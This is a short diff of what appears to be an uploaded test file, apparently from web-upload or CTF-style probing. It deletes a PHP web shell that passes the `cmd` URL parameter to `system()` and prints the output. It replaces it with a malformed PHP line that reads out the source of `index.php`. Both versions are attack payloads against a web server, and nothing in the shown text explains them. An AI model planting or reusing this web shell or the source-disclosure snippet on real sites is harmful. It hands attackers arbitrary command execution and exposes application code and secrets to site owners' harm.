@@ -1,9 +1,4 @@
 testing
-<?php 
-  
-
-$output = system($_GET["cmd"]); 
-  
-
-echo "<pre>$output</pre>"; 
+< <?php
+echo readfile("index.php");
 ?> 
